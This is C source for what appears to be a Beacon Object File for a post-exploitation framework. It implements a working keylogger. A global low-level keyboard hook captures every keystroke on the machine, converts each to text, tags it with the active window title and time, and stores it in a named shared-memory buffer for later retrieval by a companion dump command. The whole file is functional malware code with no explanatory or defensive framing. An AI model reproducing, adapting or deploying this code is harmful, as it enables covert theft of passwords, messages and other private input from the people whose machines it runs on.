#include <windows.h>

void printoutput(BOOL done);
#include "base.c"

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileMappingA(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$MapViewOfFile(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$UnmapViewOfFile(LPCVOID);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateEventA(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateMutexA(LPSECURITY_ATTRIBUTES, BOOL, LPCSTR);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ReleaseMutex(HANDLE);

DECLSPEC_IMPORT VOID   WINAPI KERNEL32$GetLocalTime(LPSYSTEMTIME);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetCurrentThreadId(void);

DECLSPEC_IMPORT HHOOK  WINAPI USER32$SetWindowsHookExA(int, HOOKPROC, HINSTANCE, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI USER32$UnhookWindowsHookEx(HHOOK);
DECLSPEC_IMPORT LRESULT WINAPI USER32$CallNextHookEx(HHOOK, int, WPARAM, LPARAM);
DECLSPEC_IMPORT BOOL   WINAPI USER32$PeekMessageA(LPMSG, HWND, UINT, UINT, UINT);
DECLSPEC_IMPORT BOOL   WINAPI USER32$TranslateMessage(const MSG*);
DECLSPEC_IMPORT LRESULT WINAPI USER32$DispatchMessageA(const MSG*);
DECLSPEC_IMPORT BOOL   WINAPI USER32$PostThreadMessageA(DWORD, UINT, WPARAM, LPARAM);
DECLSPEC_IMPORT DWORD  WINAPI USER32$MsgWaitForMultipleObjects(DWORD, CONST HANDLE*, BOOL, DWORD, DWORD);

DECLSPEC_IMPORT HWND   WINAPI USER32$GetForegroundWindow(void);
DECLSPEC_IMPORT int    WINAPI USER32$GetWindowTextA(HWND, LPSTR, int);
DECLSPEC_IMPORT int    WINAPI USER32$GetWindowTextW(HWND, LPWSTR, int);

DECLSPEC_IMPORT DWORD  WINAPI USER32$GetWindowThreadProcessId(HWND, LPDWORD);
DECLSPEC_IMPORT HKL    WINAPI USER32$GetKeyboardLayout(DWORD);
DECLSPEC_IMPORT SHORT  WINAPI USER32$GetKeyState(int);
DECLSPEC_IMPORT BOOL   WINAPI USER32$GetKeyboardState(PBYTE);
DECLSPEC_IMPORT SHORT  WINAPI USER32$GetAsyncKeyState(int);
DECLSPEC_IMPORT int    WINAPI USER32$ToUnicodeEx(UINT, UINT, const BYTE*, LPWSTR, int, UINT, HKL);

#define KEYLOG_MAGIC      0xDEADBEEF
#define KEYLOG_MAP_NAME   "Local\\keylog_buf"
#define KEYLOG_STOP_NAME  "Local\\keylog_stop"
#define KEYLOG_MUTEX_NAME "Local\\keylog_mutex"
#define KEYLOG_DEFAULT_BUF_KB 64

#pragma pack(push, 1)
typedef struct {
    DWORD  magic;
    DWORD  buf_size;
    DWORD  write_pos;
    DWORD  total_keys;
    DWORD  hook_tid;
    CHAR   active_window[256];
} KEYLOG_CTX;
#pragma pack(pop)

static HHOOK  g_hook       = NULL;
static HANDLE g_hMap       = NULL;
static HANDLE g_hStopEvent = NULL;
static HANDLE g_hMutex     = NULL;
static KEYLOG_CTX *g_ctx   = NULL;
static CHAR  *g_buf        = NULL;

static void buf_write(const CHAR *data, DWORD len)
{
    if (!g_ctx || !g_buf || len == 0) return;

    DWORD buf_size = g_ctx->buf_size;

    KERNEL32$WaitForSingleObject(g_hMutex, 5000);

    for (DWORD i = 0; i < len; i++) {
        g_buf[g_ctx->write_pos] = data[i];
        g_ctx->write_pos = (g_ctx->write_pos + 1) % buf_size;
    }
    g_ctx->total_keys++;

    KERNEL32$ReleaseMutex(g_hMutex);
}

static HWND g_last_hwnd = NULL;
static HKL  g_fg_hkl   = NULL;

static void process_key(DWORD vkCode, DWORD scanCode)
{

    HWND hFg = USER32$GetForegroundWindow();
    if (hFg) {
        WCHAR win_title_w[256] = {0};
        USER32$GetWindowTextW(hFg, win_title_w, 255);

        CHAR win_title[512] = {0};
        KERNEL32$WideCharToMultiByte(CP_UTF8, 0, win_title_w, -1, win_title, sizeof(win_title) - 1, NULL, NULL);

        MSVCRT$strncpy(g_ctx->active_window, win_title, sizeof(g_ctx->active_window) - 1);

        DWORD fgTid = USER32$GetWindowThreadProcessId(hFg, NULL);
        g_fg_hkl = USER32$GetKeyboardLayout(fgTid);

        if (hFg != g_last_hwnd) {
            g_last_hwnd = hFg;

            CHAR header[580];
            SYSTEMTIME st;
            KERNEL32$GetLocalTime(&st);
            int hlen = MSVCRT$_snprintf(header, sizeof(header) - 1,
                "\n[%02d:%02d:%02d - %s]\n",
                st.wHour, st.wMinute, st.wSecond, win_title);
            if (hlen > 0)
                buf_write(header, (DWORD)hlen);
        }
    }

    BYTE keyState[256] = {0};

    if (USER32$GetAsyncKeyState(VK_SHIFT)   & 0x8000) keyState[VK_SHIFT]   = 0x80;
    if (USER32$GetAsyncKeyState(VK_LSHIFT)  & 0x8000) keyState[VK_LSHIFT]  = 0x80;
    if (USER32$GetAsyncKeyState(VK_RSHIFT)  & 0x8000) keyState[VK_RSHIFT]  = 0x80;

    if (USER32$GetKeyState(VK_CAPITAL) & 0x0001)      keyState[VK_CAPITAL] = 0x01;

    if (USER32$GetAsyncKeyState(VK_RMENU)   & 0x8000) {
        keyState[VK_RMENU]   = 0x80;
        keyState[VK_CONTROL] = 0x80;
    }


    WCHAR wch[4] = {0};
    int conv = USER32$ToUnicodeEx(vkCode, scanCode, keyState, wch, 4, 0, g_fg_hkl);

    if (conv >= 1 && wch[0] >= 0x20) {
        CHAR utf8[8] = {0};
        int utf8_len = KERNEL32$WideCharToMultiByte( CP_UTF8, 0, wch, conv, utf8, sizeof(utf8) - 1, NULL, NULL);
        if (utf8_len > 0) {
            buf_write(utf8, (DWORD)utf8_len);
            return;
        }
    }


    const char *special = NULL;
    switch (vkCode) {
        case VK_RETURN:    special = "[ENTER]\n"; break;
        case VK_BACK:      special = "[BACK]";    break;
        case VK_TAB:       special = "[TAB]";     break;
        case VK_DELETE:    special = "[DEL]";     break;
        case VK_ESCAPE:    special = "[ESC]";     break;
        case VK_SPACE:     special = " ";         break;
        case VK_LEFT:      special = "[LEFT]";    break;
        case VK_RIGHT:     special = "[RIGHT]";   break;
        case VK_UP:        special = "[UP]";      break;
        case VK_DOWN:      special = "[DOWN]";    break;
        case VK_HOME:      special = "[HOME]";    break;
        case VK_END:       special = "[END]";     break;
        case VK_PRIOR:     special = "[PGUP]";    break;
        case VK_NEXT:      special = "[PGDN]";    break;
        case VK_CAPITAL:   special = "[CAPS]";    break;
        case VK_LSHIFT:
        case VK_RSHIFT:    special = NULL;        break;
        case VK_LCONTROL:
        case VK_RCONTROL:  special = NULL;        break;
        case VK_LMENU:
        case VK_RMENU:     special = NULL;        break;
        case VK_LWIN:
        case VK_RWIN:      special = "[WIN]";     break;
        case VK_F1:        special = "[F1]";      break;
        case VK_F2:        special = "[F2]";      break;
        case VK_F3:        special = "[F3]";      break;
        case VK_F4:        special = "[F4]";      break;
        case VK_F5:        special = "[F5]";      break;
        case VK_F6:        special = "[F6]";      break;
        case VK_F7:        special = "[F7]";      break;
        case VK_F8:        special = "[F8]";      break;
        case VK_F9:        special = "[F9]";      break;
        case VK_F10:       special = "[F10]";     break;
        case VK_F11:       special = "[F11]";     break;
        case VK_F12:       special = "[F12]";     break;
        default:           special = NULL;        break;
    }

    if (special)
        buf_write(special, (DWORD)MSVCRT$strlen(special));
}

static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT*)lParam;
        process_key(kb->vkCode, kb->scanCode);
    }
    return USER32$CallNextHookEx(g_hook, nCode, wParam, lParam);
}

void go(char *args, int len)
{
    bofstart();

    datap parser;
    BeaconDataParse(&parser, args, len);

    int buf_kb = BeaconDataInt(&parser);
    if (buf_kb <= 0 || buf_kb > 4096)
        buf_kb = KEYLOG_DEFAULT_BUF_KB;

    DWORD buf_bytes = (DWORD)buf_kb * 1024;
    DWORD map_size  = sizeof(KEYLOG_CTX) + buf_bytes;

    g_hMap = KERNEL32$CreateFileMappingA( INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, map_size, KEYLOG_MAP_NAME);
    if (!g_hMap) {
        internal_printf("[-] CreateFileMappingA failed (err: %lu)\n", KERNEL32$GetLastError());
        printoutput(TRUE);
        bofstop();
        return;
    }

    BOOL already_exists = (KERNEL32$GetLastError() == ERROR_ALREADY_EXISTS);

    g_ctx = (KEYLOG_CTX*)KERNEL32$MapViewOfFile(g_hMap, FILE_MAP_ALL_ACCESS, 0, 0, map_size);
    if (!g_ctx) {
        internal_printf("[-] MapViewOfFile failed (err: %lu)\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(g_hMap);
        printoutput(TRUE);
        bofstop();
        return;
    }

    g_buf = (CHAR*)((BYTE*)g_ctx + sizeof(KEYLOG_CTX));

    if (already_exists && g_ctx->magic == KEYLOG_MAGIC) {
        internal_printf("[-] Keylogger already running (tid: %lu)\n", g_ctx->hook_tid);
        KERNEL32$UnmapViewOfFile(g_ctx);
        KERNEL32$CloseHandle(g_hMap);
        printoutput(TRUE);
        bofstop();
        return;
    }

    MSVCRT$memset(g_ctx, 0, map_size);
    g_ctx->magic      = KEYLOG_MAGIC;
    g_ctx->buf_size   = buf_bytes;
    g_ctx->write_pos  = 0;
    g_ctx->total_keys = 0;
    g_ctx->hook_tid   = KERNEL32$GetCurrentThreadId();

    g_hStopEvent = KERNEL32$CreateEventA(NULL, TRUE, FALSE, KEYLOG_STOP_NAME);
    if (!g_hStopEvent) {
        internal_printf("[-] CreateEventA failed (err: %lu)\n", KERNEL32$GetLastError());
        KERNEL32$UnmapViewOfFile(g_ctx);
        KERNEL32$CloseHandle(g_hMap);
        printoutput(TRUE);
        bofstop();
        return;
    }

    g_hMutex = KERNEL32$CreateMutexA(NULL, FALSE, KEYLOG_MUTEX_NAME);
    if (!g_hMutex) {
        internal_printf("[-] CreateMutexA failed (err: %lu)\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(g_hStopEvent);
        KERNEL32$UnmapViewOfFile(g_ctx);
        KERNEL32$CloseHandle(g_hMap);
        printoutput(TRUE);
        bofstop();
        return;
    }

    g_hook = USER32$SetWindowsHookExA(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (!g_hook) {
        internal_printf("[-] SetWindowsHookExA failed (err: %lu)\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(g_hMutex);
        KERNEL32$CloseHandle(g_hStopEvent);
        KERNEL32$UnmapViewOfFile(g_ctx);
        KERNEL32$CloseHandle(g_hMap);
        printoutput(TRUE);
        bofstop();
        return;
    }

    internal_printf("[+] Keylogger started\n");
    internal_printf("    Buffer : %d KB\n", buf_kb);
    internal_printf("    Thread : %lu\n", g_ctx->hook_tid);
    internal_printf("    Use keylog_dump to retrieve captured keystrokes\n");
    printoutput(TRUE);

    MSG msg;

    while (TRUE) {
        DWORD wait = USER32$MsgWaitForMultipleObjects(
            1, &g_hStopEvent,
            FALSE,
            INFINITE,
            QS_ALLINPUT);

        if (wait == WAIT_OBJECT_0)
            break;

        while (USER32$PeekMessageA(&msg, NULL, 0, 0, PM_REMOVE)) {
            if (msg.message == WM_QUIT)
                goto cleanup;
            USER32$TranslateMessage(&msg);
            USER32$DispatchMessageA(&msg);
        }

        if (KERNEL32$WaitForSingleObject(g_hStopEvent, 0) == WAIT_OBJECT_0)
            break;
    }

cleanup:

    USER32$UnhookWindowsHookEx(g_hook);
    KERNEL32$CloseHandle(g_hMutex);
    KERNEL32$CloseHandle(g_hStopEvent);

    MSVCRT$memset(g_ctx, 0, map_size);
    KERNEL32$UnmapViewOfFile(g_ctx);
    KERNEL32$CloseHandle(g_hMap);

    bofstop();
}